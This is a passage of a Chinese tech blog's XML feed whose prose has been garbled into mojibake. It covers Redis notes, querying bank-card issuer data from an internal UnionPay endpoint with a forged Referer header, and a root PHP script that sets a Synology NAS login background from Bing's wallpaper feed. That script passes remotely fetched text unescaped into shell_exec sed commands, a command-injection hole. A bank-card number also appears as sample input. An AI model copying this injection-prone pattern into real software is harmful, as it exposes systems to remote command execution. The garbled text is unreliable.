æ¥åšç¼“å­˜ï¼Œä¹Ÿå¯ä»¥ç”¨äºæµé‡å‰Šå³°ï¼Œå¹´ä¼šæŠ½å¥–ï¼Œç¤¾äº¤æ¨èã€‚æ‰€æœ‰å·¥å…·çš„èƒŒåéƒ½å–å†³äºäººï¼Œåˆ›æ–°äº§ç”Ÿä»·å€¼ã€‚</p></blockquote><p>Redis ä¸­å€¼å¾—æˆ‘ä»¬å…³æ³¨çš„åœ°æ–¹ï¼š</p><ul><li>åŸºç¡€æ•°æ®ç±»å‹</li><li>ä¸»ä»å¤åˆ¶</li><li>å“¨å…µ</li><li>é›†ç¾¤</li><li>å¦‚ä½•åšåˆ°é«˜æ€§èƒ½ã€ä½å¤æ‚åº¦</li><li>å¦‚ä½•ä¿éšœä¸»ä»ã€å“¨å…µã€é›†ç¾¤çš„æ•°æ®ä¸€è‡´æ€§</li></ul>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é“¶è”æŸ¥è¯¢é“¶è¡Œå¡ä¿¡æ¯</title>
      <link href="/post/get-bank-info-by-unionpay/"/>
      <url>/post/get-bank-info-by-unionpay/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8pqhsfuiuj30fa0b40u3.jpg" alt=""></p><a id="more"></a><blockquote><p><em>é“¶è”å·²äº 2020 å¹´ 1 æœˆä¸‹æ¶è¯¥é¡µé¢åŠåŠŸèƒ½ï¼Œæœ¬æ–‡æ‰€ææ–¹å¼å·²å¤±æ•ˆã€‚</em></p></blockquote><p>ä¸çŸ¥é“ä½ åœ¨ç”¨æ‰‹æœºé“¶è¡Œè½¬è´¦æ—¶æ³¨æ„è¿‡æ²¡æœ‰ï¼Œå½“ä½ è¾“å…¥å¡å·æ—¶ï¼Œä¼šè‡ªåŠ¨è¯†åˆ«å½’å±é“¶è¡Œï¼Œè¯†åˆ«å¤±è´¥æ—¶ï¼Œåˆ™ä¼šè®©ç”¨æˆ·æ‰‹åŠ¨é€‰æ‹©ã€‚æœ€è¿‘åœ¨åšä¸€ä¸ªç±»ä¼¼é“¶è¡Œå¡ä¿¡æ¯éœ€æ±‚æ—¶ï¼Œæƒ³åˆ°åº”è¯¥ä¼šæœ‰è¿™æ ·çš„ä¸€ä¸ªæ¥å£ï¼ŒGoogle åå‘ç°è¿˜çœŸçš„æœ‰å®˜æ–¹æ¥å£ï¼Œè€Œä¸”æœ‰ä½“éªŒé¡µé¢ğŸ‘‰<a href="https://open.unionpay.com/tjwx/openapi/cardbin-pc.html" target="_blank" rel="noopener">é“¶è¡Œå¡ä¿¡æ¯æŸ¥è¯¢ä½“éªŒ</a>ï¼Œè¯¦ç»†çš„æ¥å£ä¿¡æ¯<a href="https://open.unionpay.com/tjweb/api/interface?apiSvcId=51&id=129" target="_blank" rel="noopener">é“¶è¡Œå¡ä¿¡æ¯æŸ¥è¯¢</a>ã€‚ä¸è¿‡å½“æˆ‘æ³¨å†Œäº†å¼€å‘è€…æ—¶ï¼Œå‘ç°è¯¥æ¥å£æ— æ³•ä½¿ç”¨ï¼Œæäº¤å·¥å•åå¾—åˆ°ä»¥ä¸‹å›å¤</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8pqlc4u98j31440cywhp.jpg" alt=""></p><p>æ—¢ç„¶æ— æ³•é€šè¿‡æ­£å¸¸è°ƒç”¨ä½¿ç”¨ï¼Œé‚£å°±æ›²å¾„é€šå¹½å§ã€‚æˆ‘ä»¬é€šè¿‡åˆ†ææŸ¥è¯¢ä½“éªŒé¡µåå°±æœ‰äº†ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// è·å–é“¶è¡Œå¡çš„å‘å¡è¡Œã€å‘å¡è¡Œæœºæ„ä»£ç ã€å¡æ€§è´¨ã€å¡ç±»åˆ«ã€å¡ç§ã€å¡å“ç‰Œã€å¡äº§å“ã€å¡ç­‰çº§ã€å¡ä»‹è´¨ã€æ‰€å±æ€»è¡Œæœºæ„ä¸­æ–‡åç§°ã€æ‰€å±æ€»è¡Œæœºæ„ä¸­æ–‡ç®€ç§°ã€‚</span></span><br><span class="line"></span><br><span class="line">$cardNo = <span class="string">'6227000280070981140'</span>;</span><br><span class="line"></span><br><span class="line">$ch = curl_init(<span class="string">'https://open.unionpay.com/tjwx/api/cardbin/cardinfo'</span>);</span><br><span class="line">curl_setopt_array(</span><br><span class="line">    $ch,</span><br><span class="line">    [</span><br><span class="line">        CURLOPT_POST =&gt; <span class="keyword">true</span>,</span><br><span class="line">        CURLOPT_POSTFIELDS =&gt; http_build_query([<span class="string">'cardNo'</span> =&gt; $cardNo]),<span class="comment">//è®¾å®š POST å‚æ•°å†…å®¹</span></span><br><span class="line">        <span class="comment">// CURLOPT_FOLLOWLOCATION =&gt; true,//è·Ÿéšé‡å®šå‘åœ°å€</span></span><br><span class="line">        <span class="comment">// CURLOPT_AUTOREFERER =&gt; true,</span></span><br><span class="line">        CURLOPT_RETURNTRANSFER =&gt; <span class="keyword">true</span>,<span class="comment">//å°†curl_exec()è·å–çš„ä¿¡æ¯ä»¥å­—ç¬¦ä¸²è¿”å›ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡ºã€‚</span></span><br><span class="line">        CURLOPT_USERAGENT =&gt; <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'</span>,</span><br><span class="line">        CURLOPT_REFERER =&gt; <span class="string">'https://open.unionpay.com/tjwx/openapi/cardbin-pc.html'</span>,<span class="comment">//å¿…å¡«é¡¹</span></span><br><span class="line">        CURLOPT_HTTPHEADER =&gt; [<span class="string">"Content-Type: application/x-www-form-urlencoded"</span>, <span class="string">"Accept: application/json, text/javascript, */*; q=0.01"</span>]</span><br><span class="line">    ]</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$resp = curl_exec($ch);</span><br><span class="line"></span><br><span class="line">curl_close($ch);</span><br><span class="line"></span><br><span class="line">$resp_obj = json_decode($resp);</span><br><span class="line"><span class="keyword">if</span> ($resp_obj-&gt;state) &#123;</span><br><span class="line">    <span class="comment">// å‘å¡è¡Œä¸­æ–‡å</span></span><br><span class="line">    $bankCnName = $resp_obj-&gt;data-&gt;issNm;</span><br><span class="line">    <span class="comment">// å‘å¡è¡Œä¸­æ–‡ç®€ç§°</span></span><br><span class="line">    $bankCnShortName = $resp_obj-&gt;data-&gt;issAbbr;</span><br><span class="line">    <span class="comment">// å‘å¡è¡Œæœºæ„ä»£ç </span></span><br><span class="line">    $issInsId = $resp_obj-&gt;data-&gt;issInsId;</span><br><span class="line">    <span class="comment">// å¡æ€§è´¨ cardAttr</span></span><br><span class="line">    <span class="comment">// å¡ç±»åˆ« cardCata</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™äº›ä¿¡æ¯å¯¹æˆ‘å·²ç»å¤Ÿç”¨äº†ï¼Œé“¶è”è¿˜æœ‰å¾ˆå¤šå…¶å®ƒçš„ä¾¿æ·æ¥å£ï¼Œæœ‰äº›å…¬å…±ä¿¡æ¯æˆ‘ä»¬æ˜¯å¯ä»¥å…é™¤ç”¨æˆ·è¾“å…¥ï¼Œç³»ç»Ÿè‡ªåŠ¨æŠ“å–ç›¸å…³ä¿¡æ¯è¡¥å……ï¼Œæ—¢å‡å°‘äº†ç”¨æˆ·çš„è¾“å…¥ï¼Œåˆèƒ½é¿å…é”™è¯¯è¾“å…¥ï¼Œæ˜¯ä¸€ç§ä¸é”™çš„æå‡ç”¨æˆ·ä½“éªŒçš„æ€è·¯ã€‚ä¸è¿‡è¦è€ƒè™‘åˆ°æœ‰æ—¶å€™æ— æ³•æ­£ç¡®æ‹‰å–åˆ°ç»“æœï¼Œå¯¹äºæ‹‰å–å¤±è´¥ä»éœ€ç»™ç”¨æˆ·ç•™ä¸‹æ‰‹åŠ¨è¾“å…¥çš„ç©ºé—´ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€TODOã€‘ è‡ªåŠ¨å¤‡ä»½åšå®¢å›¾ç‰‡</title>
      <link href="/post/auto-backup-blog-images/"/>
      <url>/post/auto-backup-blog-images/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8jjsz0gmzj31gy0u0qo5.jpg" alt=""></p><a id="more"></a><p>å†™åšå®¢çš„éƒ½ä¼šæœ‰å›¾åºŠçš„é—®é¢˜ï¼Œä½¿ç”¨ç¬¬ä¸‰æ–¹å›¾åºŠè¦ä¹ˆæ˜¯ä»˜è´¹é—®é¢˜ï¼Œè¦ä¹ˆæ˜¯å€’é—­é—®é¢˜ã€‚æˆ‘æœ€æ—©ä½¿ç”¨çš„ä¸ƒç‰›äº‘ï¼Œåæ¥çªç„¶å…³é—­äº†å…è´¹å®¹é‡ï¼Œä¸‹è½½éƒ½éœ€è¦ç»‘å®šå¤‡æ¡ˆåŸŸåï¼Œä¹Ÿä¸å…è®¸æŸ¥çœ‹ï¼Œå¯¼è‡´æ—©æœŸåšæ–‡å›¾ç‰‡æ— æ³•æ¢å¤ï¼Œåªèƒ½ä»¥åæŠ½ç©ºé‡å†™ä¸€ä¸‹äº†ã€‚ç°åœ¨ç”¨çš„æ˜¯æ–°æµªå…è´¹å›¾åºŠï¼Œç»“åˆ iPic ä½¿ç”¨éå¸¸ä¾¿æ·ï¼Œä¹‹å‰æ–°æµªæœ‰è¿‡ä¸€æ¬¡é™åˆ¶ï¼Œæ‰€æœ‰å›¾ç‰‡éƒ½è®¿é—®ä¸äº†äº†ï¼Œåæ¥åŠ äº†ä¸€è¡Œä»£ç è§£å†³äº†ã€‚ä½†å¦‚æœæœªæ¥æ–°æµªçªç„¶å…¨éƒ¨å°æ­»ï¼Œé‚£åˆè¦é‡è¹ˆä¸ƒç‰›äº‘çš„è¦†è¾™ã€‚æ‰€ä»¥è¿˜æ˜¯éœ€è¦æœªé›¨ç»¸ç¼ªã€‚</p><p>ç°åœ¨çš„ iPic æ–¹å¼ç®€ç›´ä¸è¦å¤ªæ–¹ä¾¿ï¼Œç™½å«–çš„æ–°æµªå›¾åºŠåŠ è½½é€Ÿåº¦ä¹Ÿå¾ˆä¸é”™ï¼Œæ‰€ä»¥è¿˜å¯ä»¥ç»§ç»­ä½¿ç”¨ï¼Œä¸è¿‡å¯ä»¥å†™ä¸€æ®µè„šæœ¬ï¼Œå½“æ£€æµ‹åˆ°ä»“åº“æœ‰æ–°çš„æäº¤æ—¶ï¼Œå°±æ£€ç´¢è¯¥æ–‡ç« ä¸‹çš„å›¾ç‰‡ï¼Œå¹¶ä¸‹è½½å¤‡ä»½åˆ° NAS ä¸­ã€‚å½“ç„¶ï¼Œåœ¨è¿™ä¸ªå·¥ä½œä¹‹å‰ï¼Œè¿˜éœ€è¦å°†åŸæœ‰åšæ–‡çš„å›¾ç‰‡åç§°è¡¥å……å®Œï¼Œå¹¶å°†å†å²çš„å›¾ç‰‡æŒ‰æ—¶é—´ã€æ–‡ç« ä¿å­˜ï¼Œä»¥ä¾¿æœªæ¥å›¾åºŠå¤±æ•ˆèƒ½å¿«é€Ÿæ¢å¤å›¾ç‰‡ã€‚</p><p>ä½¿ç”¨ <a href="https://github.com/rosell-dk/webp-convert" target="_blank" rel="noopener">webp-convert</a> å°† jpg &amp; png å›¾ç‰‡è½¬æ¢ä¸º webp æ ¼å¼ï¼Œä»¥èŠ‚çœå¸¦å®½ï¼ŒåŠ é€Ÿè®¿é—®ï¼Œæ•ˆæœå¯ä»¥åœ¨ <a href="https://developers.google.com/speed/pagespeed/insights/" target="_blank" rel="noopener">Google PageSpeed Insights</a> æŸ¥çœ‹</p><p>å·²éªŒè¯ï¼šæ–°æµªå›¾åºŠä¸æ”¯æŒ webp æ ¼å¼ï¼Œwebp ä¸Šä¼ åä¼šè¢«è½¬ä¸º jpgï¼Œä¼¼ä¹ä¼šå¯¹å›¾ç‰‡å†…å®¹è¿›è¡Œç¼–ç ï¼Œåªå‚¨å­˜ä¸€ä»½åŒæ ·å†…å®¹æ–‡ä»¶ï¼Œæ›´æ¢ä¸åŒçš„æ–‡ä»¶åæ˜ å°„ï¼ŒåŸç†ç±»ä¼¼äºç™¾åº¦äº‘ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¾¤æ™–NASè‡ªåŠ¨æ›´æ¢ç™»å½•é¡µèƒŒæ™¯</title>
      <link href="/post/nas-auto-change-bgimg/"/>
      <url>/post/nas-auto-change-bgimg/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g8iauczkluj30pa0jw4ar.jpg" alt=""></p><a id="more"></a><p>ç¾¤æ™–é»˜è®¤çš„ç™»é™†é¡µå®åœ¨æ˜¯å¤ªå•è°ƒäº†ï¼Œä¹‹å‰çœ‹è¿‡å¾ˆå¤šæŠ“å–å¿…åº”å›¾ç‰‡è‡ªåŠ¨æ›´æ¢çš„ä¾‹å­ï¼Œä»Šå¤©ä¹Ÿæƒ³äº²è‡ªå®æˆ˜ä¸€æŠŠåº”ç”¨åœ¨ç¾¤æ™–ç™»é™†é¡µä¸Šã€‚äºæ˜¯ Google åˆ°äº†è¿™æ ·ä¸€ç¯‡æ–‡ç« <a href="https://03k.org/dsm-bing.html" target="_blank" rel="noopener">å·§ç”¨è®¡åˆ’ä»»åŠ¡ä¿®æ”¹ç¾¤æ™–ç™»å½•å£çº¸</a>ï¼Œè¿™æ˜¯ä¸€ç¯‡å‘å¸ƒæ—¶é—´è¾ƒä¹…çš„æ–‡ç« ï¼Œå…¶ä¸­çš„ä¸€äº›ä¿¡æ¯å¯èƒ½å·²ç»å¤±æ•ˆï¼Œä½†å…¶ä»–åœ°æ–¹çš„å¾ˆå¤šæ–‡ç« éƒ½æ˜¯æ‹·è´è¿™é‡Œçš„ï¼Œæ‰€ä»¥è¿˜æ˜¯å†³å®šæŒ‰å›¾ç´¢éª¥è¯•ä¸€è¯•ã€‚</p><p>è¿™ä¸ªæ–‡ç« æ˜¯ç”¨ shell å†™çš„ï¼Œä½†æˆ‘è§‰å¾—é‡Œè¾¹çš„åŠŸèƒ½ç”¨ PHP ä¹Ÿèƒ½å®ç°ï¼ˆè¿™æ€ä¹ˆä¼šéš¾å¾—ä½ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€å‘¢ğŸ˜œï¼‰ï¼Œé€šè¿‡å¿…åº”é¦–é¡µæ§åˆ¶å°åˆ†æå¯çŸ¥ï¼Œä»ä¸€ä¸ªåœ°å€<code>https://cn.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1&amp;nc=1572500909531&amp;pid=hp&amp;FORM=BEHPTB&amp;video=1</code>è·å–å›¾ç‰‡ URIï¼Œè¿”å›å®Œæ•´ç»“æœå¦‚ä¸‹ã€‚å–çš„å›¾ç‰‡ URI åå†ä»¥ GET æ–¹å¼è·å–å›¾ç‰‡å†…å®¹ã€‚è¿›ä¸€æ­¥åˆ†æå¯å¾—ï¼ŒURLä¸­çš„ <code>idx</code> ä¸º 0 æ—¶è¡¨ç¤ºè¿”å›å½“å¤©å›¾ç‰‡ï¼Œ1 ä¸ºå‰ä¸€å¤©ï¼Œä»¥æ­¤ç±»æ¨ï¼Œæœ€å¤§æœ‰æ•ˆå€¼ä¸º 8ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"images"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"startdate"</span>: <span class="string">"20191031"</span>,</span><br><span class="line">      <span class="attr">"fullstartdate"</span>: <span class="string">"201910311600"</span>,</span><br><span class="line">      <span class="attr">"enddate"</span>: <span class="string">"20191101"</span>,</span><br><span class="line">      <span class="attr">"url"</span>: <span class="string">"/th?id=OHR.AlbertaOwl_ZH-CN1184867720_1920x1080.jpg&amp;rf=LaDigue_1920x1080.jpg&amp;pid=hp"</span>,</span><br><span class="line">      <span class="attr">"urlbase"</span>: <span class="string">"/th?id=OHR.AlbertaOwl_ZH-CN1184867720"</span>,</span><br><span class="line">      <span class="attr">"copyright"</span>: <span class="string">"ä¸€åªååœ¨ç™½æ¨æ ‘ä¸Šçš„å¤§é›•é¸®ï¼Œé˜¿å°”ä¼¯å¡” (Â© Ambre Haller/Getty Images)"</span>,</span><br><span class="line">      <span class="attr">"copyrightlink"</span>: <span class="string">"/search?q=%e5%a4%a7%e9%9b%95%e9%b8%ae&amp;form=HPCAPT&amp;mkt=zh-cn"</span>,</span><br><span class="line">      <span class="attr">"title"</span>: <span class="string">""</span>,</span><br><span class="line">      <span class="attr">"quiz"</span>: <span class="string">"/search?q=Bing+homepage+quiz&amp;filters=WQOskey:%22HPQuiz_20191031_AlbertaOwl%22&amp;FORM=HPQUIZ"</span>,</span><br><span class="line">      <span class="attr">"wp"</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">"hsh"</span>: <span class="string">"a76d074e286a1dd8aa778815fe611e2e"</span>,</span><br><span class="line">      <span class="attr">"drk"</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">"top"</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">"bot"</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">"hs"</span>: []</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"tooltips"</span>: &#123;</span><br><span class="line">    <span class="attr">"loading"</span>: <span class="string">"æ­£åœ¨åŠ è½½..."</span>,</span><br><span class="line">    <span class="attr">"previous"</span>: <span class="string">"ä¸Šä¸€ä¸ªå›¾åƒ"</span>,</span><br><span class="line">    <span class="attr">"next"</span>: <span class="string">"ä¸‹ä¸€ä¸ªå›¾åƒ"</span>,</span><br><span class="line">    <span class="attr">"walle"</span>: <span class="string">"æ­¤å›¾ç‰‡ä¸èƒ½ä¸‹è½½ç”¨ä½œå£çº¸ã€‚"</span>,</span><br><span class="line">    <span class="attr">"walls"</span>: <span class="string">"ä¸‹è½½ä»Šæ—¥ç¾å›¾ã€‚ä»…é™ç”¨ä½œæ¡Œé¢å£çº¸ã€‚"</span>,</span><br><span class="line">    <span class="attr">"play"</span>: <span class="string">"æ’­æ”¾è§†é¢‘"</span>,</span><br><span class="line">    <span class="attr">"pause"</span>: <span class="string">"æš‚åœè§†é¢‘"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è¦åˆ†æç¾¤æ™–æ˜¯ä»ä½•å¤„è¯»å–çš„å›¾ç‰‡ï¼Œä»æŸ¥åˆ°çš„æ–‡ç« å¯çŸ¥ï¼Œå›¾ç‰‡ä½äº<code>/usr/syno/etc/login_background.jpg</code>å’Œ<code>/usr/syno/etc/login_background_hd.jpg</code>ã€‚æ‰€ä»¥æˆ‘ä»¬è¦åˆ°ç»ˆç«¯ä¸€æ¢ç©¶ç«Ÿã€‚é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åœ¨æ§åˆ¶é¢æ¿çš„ç»ˆç«¯é‡Œå¼€å¯ ssh æœåŠ¡<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8ia5v9rjqj30j80frwg5.jpg" alt=""></p><p>ç„¶åæˆ‘ä»¬ä»¥å‘½ä»¤<code>ssh username@hostname [-p port]</code>ç™»é™† NASï¼Œç”±äºå›¾ç‰‡å­˜å‚¨ä½ç½®éœ€è¦ root æƒé™ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ç”¨å‘½ä»¤<code>sudo -i</code>åˆ‡æ¢åˆ° root ç”¨æˆ·ã€‚ï¼ˆå¦‚æœéœ€è¦åœ¨å…¬ç½‘sshç™»é™†ï¼Œåªéœ€è¦åœ¨è·¯ç”±å™¨ä¸Šå°† NAS çš„ ssh ç«¯å£è½¬å‘å³å¯ï¼‰</p><blockquote><p>å°æ’æ›²ï¼šå½“æˆ‘é…ç½®äº†.ssh/config æƒ³è¦ ssh å…å¯†ç™»é™†æ—¶ï¼Œå‘ç° NAS ä»ç„¶æ¯æ¬¡è¦æ±‚å¯†ç ï¼Œä½¿å¾—æˆ‘ä¸€åº¦ä»¥ä¸ºæ˜¯é…ç½®æœ‰è¯¯ï¼Œç›´åˆ°æˆ‘é‡æ–°ç»™æ¡Œè§’åƒç°çš„æ ‘è“æ´¾é€šç”µï¼Œæ‰å‘ç°ç¡®å®æ˜¯ NAS ç³»ç»Ÿçš„é—®é¢˜ï¼Œæœ€åæ‰¾åˆ°äº†è¿™æ ·ä¸€ç¯‡æ–‡ç« <a href="https://soulteary.com/2018/07/20/synology-passwordless-ssh.html" target="_blank" rel="noopener">è®¾ç½®ç¾¤æ™– 6.1 ä»¥åŠ 6.2 ä½¿ç”¨è¯ä¹¦å…å¯†ç™»å½•</a>ï¼Œåœ¨æŒ‰ç…§æ–‡ç« é‡å¯ sshd æœåŠ¡å°è¯•ä¿®å¤æ—¶ï¼Œå‘ç° sshd æœåŠ¡èµ·ä¸æ¥äº†ğŸ˜…ï¼Œæœ€åç»ˆäºåœ¨æ§åˆ¶é¢æ¿ ==&gt; ä¿¡æ¯ä¸­å¿ƒ ==&gt; æœåŠ¡ ä¸­é‡æ–°å¯åŠ¨æœåŠ¡ã€‚å—¯ï¼Œæˆ‘è§‰å¾—æˆ‘è¿˜èƒ½å¿ï¼Œä¹Ÿå°±æ¯æ¬¡ç™»é™†çš„æ—¶å€™å¤šèŠ±ä¸¤ç§’é’Ÿå˜›ï¼Œå¼ºè¿«ç—‡è¦é€‚æ—¶ä½å¤´</p></blockquote><p>å½“æˆ‘è¿›å…¥ç³»ç»Ÿåï¼Œå‘ç°<code>/usr/syno/etc/</code>ä¸‹å¹¶æ²¡æœ‰<code>login_background*.jpg</code>çš„æ–‡ä»¶ï¼Œç„¶ååœ¨æ§åˆ¶é¢æ¿çš„ä¸»é¢˜ä¸­ä¿®æ”¹ç™»å½•é¡µå›¾ç‰‡ï¼Œå¹¶ç”¨<code>ll -t</code>å‘½ä»¤è§‚å¯Ÿè¯¥ç›®å½•ä¸‹çš„å˜åŒ–ï¼Œå‘ç°å‡ºç°äº†è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œæ—¶é—´ä¹Ÿæ˜¯åˆšåˆšæ“ä½œçš„æ—¶é—´ï¼Œå› æ­¤å¯ä»¥åˆ¤å®šç¡®å®è¯»å–è¯¥ä½ç½®çš„æ–‡ä»¶ã€‚<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8iaccklxcj30oq0fujuy.jpg" alt=""></p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬é€šè¿‡ä»£ç ç›´æ¥è·å–å›¾ç‰‡å†…å®¹åŠä»‹ç»ä¿¡æ¯ï¼Œå¡«å……ç™»é™†é¡µã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// è·å–å›¾ç‰‡ä¿¡æ¯</span></span><br><span class="line">$img_info = file_get_contents(<span class="string">'https://cn.bing.com/HPImageArchive.aspx?format=js&amp;idx=0&amp;n=1&amp;pid=hp&amp;FORM=BEHPTB&amp;video=1'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯·æ±‚å¤±è´¥æ—¶ï¼Œä½¿ç”¨ã€ŒServer é…±ã€å°†é”™è¯¯ä¿¡æ¯æ¨é€è‡³ç»‘å®šçš„å¾®ä¿¡</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">false</span> === $img_info) &#123;</span><br><span class="line">    file_get_contents(<span class="string">'https://sc.ftqq.com/SCg552xxx.send?text='</span> . urlencode(<span class="string">'Get bing wallpaper error!'</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$img_obj = json_decode($img_info)-&gt;images[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–å›¾ç‰‡åœ°å€</span></span><br><span class="line">$img_url = <span class="string">'https://cn.bing.com'</span> . $img_obj-&gt;url;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–å›¾ç‰‡å</span></span><br><span class="line">$url_params = parse_url($img_url)[<span class="string">'query'</span>];</span><br><span class="line">parse_str($url_params, $result);</span><br><span class="line">$filename = $result[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸‹è½½å›¾ç‰‡å¹¶ä¿å­˜</span></span><br><span class="line"><span class="comment">// æ³¨æ„æ–‡ä»¶è·¯å¾„å†™ä¸ºç»å¯¹è·¯å¾„ï¼Œé¿å…å‡ºé”™</span></span><br><span class="line">$img_rsc = file_get_contents($img_url);</span><br><span class="line">file_put_contents(<span class="string">'/var/services/homes/palemoky/work/bing_wallpaper/'</span> . $filename, $img_rsc);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†å›¾ç‰‡å¤åˆ¶åˆ°ç›®æ ‡ä½ç½®</span></span><br><span class="line">copy(<span class="string">'/var/services/homes/palemoky/work/bing_wallpaper/'</span> . $filename, <span class="string">'/usr/syno/etc/login_background.jpg'</span>);</span><br><span class="line">copy(<span class="string">'/var/services/homes/palemoky/work/bing_wallpaper/'</span> . $filename, <span class="string">'/usr/syno/etc/login_background_hd.jpg'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–å›¾ç‰‡æè¿°ä¿¡æ¯</span></span><br><span class="line"><span class="keyword">list</span>($msg, $title) = explode(<span class="string">'('</span>, rtrim($img_obj-&gt;copyright, <span class="string">')'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¿®æ”¹æ¬¢è¿ä¿¡æ¯</span></span><br><span class="line">shell_exec(<span class="string">'sed -i "/login_welcome_title/c login_welcome_title=\"'</span> . $title . <span class="string">'\"" /etc/synoinfo.conf'</span>);</span><br><span class="line">shell_exec(<span class="string">'sed -i "/login_welcome_msg/c login_welcome_msg=\"'</span> . $msg . <span class="string">'\"" /etc/synoinfo.conf'</span>);</span><br></pre></td></tr></table></figure><blockquote><p>å°æ’æ›²ï¼šè¿™é‡Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ç³»ç»Ÿé…ç½®æ–‡ä»¶<code>/etc/synoinfo.conf</code>ï¼Œæˆ‘æŸ¥è¯¢åˆ°çš„ php 